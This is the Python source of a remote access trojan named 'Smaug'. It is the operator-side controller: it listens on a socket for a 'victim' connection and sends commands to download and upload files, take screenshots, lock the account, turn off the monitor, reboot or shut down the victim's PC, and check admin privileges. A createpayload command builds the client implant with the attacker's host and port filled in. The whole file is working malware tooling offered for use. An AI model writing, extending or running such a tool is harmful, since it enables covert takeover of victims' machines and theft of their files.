#!/usr/bin
# Made by gokiimax
import os
import json
import base64
import socket
from colorama import Fore
from utils.config import *
from utils.discordRPC import *
from utils.UpdateChecker import *

# ============================================================================================================================ #

config = Config("config.json")

theme = config.get("theme")
theme_color = Fore.LIGHTRED_EX
if theme == "red":
    theme_color = Fore.LIGHTRED_EX
elif theme == "blue":
    theme_color = Fore.LIGHTBLUE_EX
elif theme == "green":
    theme_color = Fore.LIGHTGREEN_EX
elif theme == "purple":
    theme_color = Fore.MAGENTA
elif theme == "black":
    theme_color = Fore.BLACK
elif theme == "white":
    theme_color = Fore.WHITE
elif theme == "cyan":
    theme_color = Fore.CYAN

version = open("./version.txt").read()

host = config.get("host")
port = config.get("port")

# ============================================================================================================================ #

banner = f"""{theme_color}
    
                    ,'\   |\\
               / /.:  ;;
              / :'|| //
             (| | ||;'
             / ||,;'-.._
            : ,;,`';:.--`
            |:|'`-(\\\\
            ::: \-'\`'
             \\\\ \,-`.
              `'\ `.,-`-._      ,-._
       ,-.       \  `.,-' `-.  / ,..`.
      / ,.`.      `.  \ _.-' \\',: ``\ \\
     / / :..`-'''``-)  `.   _.:''  ''\ \\
    : :  '' `-..''`/    |-''  |''  '' \ \\
    | |  ''   ''  :     |__..-;''  ''  : :           » {Fore.LIGHTBLACK_EX}Smaug {Fore.GREEN}v{version} {theme_color}
    | |  ''   ''  |     ;    / ''  ''  | |           » {Fore.LIGHTBLACK_EX}Type {Fore.GREEN}'help'{Fore.LIGHTBLACK_EX} to see all available Commands{theme_color}
    | |  ''   ''  ;    /--../_ ''_ '' _| |           » {Fore.LIGHTBLACK_EX}Developed by {Fore.GREEN}gokiimax {theme_color}
    | |  ''  _;:_/    :._  /-.'',-.'',-. |           
    : :  '',;'`;/     |_ ,(   `'   `'   \|           » {Fore.LIGHTBLACK_EX}CONFIG SETTINGS {theme_color}«
     \ \  \(   /\     :,'  \\                         » {Fore.LIGHTBLACK_EX}Host: {theme_color}{host}
      \ \.'/  : /    ,)    /                         » {Fore.LIGHTBLACK_EX}Port: {theme_color}{port}
       \ ':   ':    / \   :
        `.\    :   :\  \  |
                \  | `. \ |..-_
                 ) |.  `/___-.-`
               ,'  -.'.  `. `'        _,)
               \\'\(`.\ `._ `-..___..-','
                  `'      ``-..___..-'
"""

# ============================================================================================================================ #

class Utils:

    def clear():
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
            
    def clear_command():
        if os.name == 'nt':
            os.system('cls')
            print(banner)
        else:
            os.system('clear')
            print(banner)

    def help_command():
        commands = [
            ['help        ', 'Show all available commands'],
            ['cd          ', 'Change the current directory'],
            ['ls          ', 'List the current directory'],
            ['turnmonoff  ', 'Turn the victims Monitor off'],
            ['turnmonon   ', 'Turn the victims Monitor on'],
            ['checkadmin  ', 'Check if the victim has admin Privileges'],
            ['localtime   ', 'See the victims localtime'],
            ['clear       ', 'Clear the console'],
            ['reboot      ', 'Reboot the victims pc'],
            ['shutdown    ', 'Shutdown the victims pc'],
            ['lock       ', 'Lock the victims account!'],
            ['screenshot ', 'Take a screenshot from the victims PC'],
            ['download   ', 'Download files from the victims PC'],
            ['upload     ', 'Upload files to the victims PC'],
            ['sysinfo    ', 'Shows Information about the victims PC'],
            ['close      ', 'Close the connection and exit the application from both sites']
        ]

        index = 0
        print("\n")
        print(f"\t{theme_color}╭─────────────────╮")
        for command in commands:
            print(f"{theme_color}\t│ {Fore.RESET}{index} {command[0]}{theme_color}  │{Fore.RESET} {Fore.LIGHTBLACK_EX}»{Fore.RESET} {command[1]}")
            index += 1
        print(f"\t{theme_color}╰─────────────────╯")

# ============================================================================================================================ #

class Server:

    def __init__(self, ip, port):
        # Setup socket server and bind ip and the port
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0) # Listen for incoming connections

        Utils.clear()
        print(banner)

        print(f"[+] Now listening on port {port}!")
        self.connection, self.address = server.accept() # Accept incoming connection
        
        Utils.clear()
        print(banner)

        self.username = self.data_receive()
        print(f"[+] Connected To {str(self.username)}@{str(self.address[0])}")

# ============================================================================================================================ #

    def data_receive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            except ValueError:
                continue

# ============================================================================================================================ #

    def data_send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

# ============================================================================================================================ #

    def execute_remotely(self, command):
        self.data_send(command)
        if command[0] == "close":
            self.connection.close()
            exit(-1)
        return self.data_receive()

# ============================================================================================================================ #

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

# ============================================================================================================================ #

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download completed!"

# ============================================================================================================================ #

    def handle_result(self, result):
        if "[-]" in result:
            return "\n" + Fore.RED + result + Fore.RESET + "\n"
        elif "[+]" in result:
            return "\n" + Fore.GREEN + result + Fore.RESET + "\n"
        else:
            result = result.replace("╭", f"{theme_color}╭{Fore.RESET}").replace("╰", f"{theme_color}╰{Fore.RESET}").replace("─", f"{theme_color}─{Fore.RESET}").replace("╮", f"{theme_color}╮{Fore.RESET}").replace("╯", f"{theme_color}╯{Fore.RESET}")
            result = result.replace("│", f"{theme_color}│{Fore.RESET}").replace("»", f"{Fore.LIGHTBLACK_EX}»{Fore.RESET}")
            return "\n" + Fore.RESET + result + Fore.RESET + "\n"

# ============================================================================================================================ #

    def run(self):
        while True:
            # Handle Command input
            command = input(f"{theme_color}╭── {Fore.WHITE}[ {theme_color}Smaug@{self.address[0]}{Fore.WHITE} ]\n{theme_color}╰──────# {Fore.RESET}")
            command = command.split(" ", 1)

            try:
                if command[0] == "upload":
                    fileContent = self.read_file(command[1]).decode()
                    command.append(fileContent)

                result = self.execute_remotely(command)
                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1], result)

                if command[0] == "screenshot" and "[-] Error" not in result:
                    result = self.write_file("screenshot.png", result)

                elif command[0] == "help":
                    Utils.help_command()

                elif command[0] == "clear":
                    Utils.clear_command()
            except Exception:
                result = "[-] Error running command, check the syntax of the command."
            print(self.handle_result(result=result))

# ============================================================================================================================ #

class Application():

    def printHelp(self):
        commands = [
            ['help                     ', 'Show all available commands'],
            ['start server             ', 'Start the rat server'],
            ['createpayload (<payload>)', 'Create a payload with your settings'],
            ['clear                    ', 'Clear the console'],
            ['exit                     ', 'Exit the application']
        ]

        index = 0
        print("\n")
        print(f"\t{theme_color}╭──────────────────────────────╮")
        for command in commands:
            print(f"{theme_color}\t│ {Fore.RESET}{index} {command[0]}{theme_color}  │{Fore.RESET} {Fore.LIGHTBLACK_EX}»{Fore.RESET} {command[1]}")
            index += 1
        print(f"\t{theme_color}╰──────────────────────────────╯")
        print("\n")

# ============================================================================================================================ #

    def create_payload(self):
        if os.path.isfile('./out/client.pyw'):
            os.remove("./out/client.pyw")

        with open("./resources/client.txt", 'r') as first_file, open('./out/client.pyw', 'a') as second_file:
            for line in first_file:
                second_file.write(line.replace("ENTER HOST", host).replace("'ENTER PORT'", f"{port}"))

        print(f"{Fore.LIGHTGREEN_EX}[+] Successfully created payload in './out/client.pyw'")

# ============================================================================================================================ #

    def run(self):
        while True:
            # Handle Command input
            command = input(f"{theme_color}╭── {Fore.WHITE}[ {theme_color}Smaug@admin{Fore.WHITE} ]\n{theme_color}╰──────# {Fore.RESET}")
            command = command.split(" ", 1)

            try:
                if command[0] == "start" and command[1] == "server":
                    server = Server(host, port)
                    server.run()
                    break
                
                elif command[0] == "help":
                    self.printHelp()

                elif command[0] == "clear":
                    Utils.clear_command()

                elif command[0] == "createpayload":
                    self.create_payload() 

                elif command[0] == "exit":
                    exit(-1)
            except Exception:
                print("[-] Error running command, check the syntax of the command.")

# ============================================================================================================================ #

def main():
    Utils.clear()
    print(banner)

    if(config.get("check_for_update")):
        check_for_update(version=version)

    # Start the application
    application = Application()
    if config.get("discordRPC"):
        Discord("1083754884114956400", version=f"v{version}")
    application.run()


main()
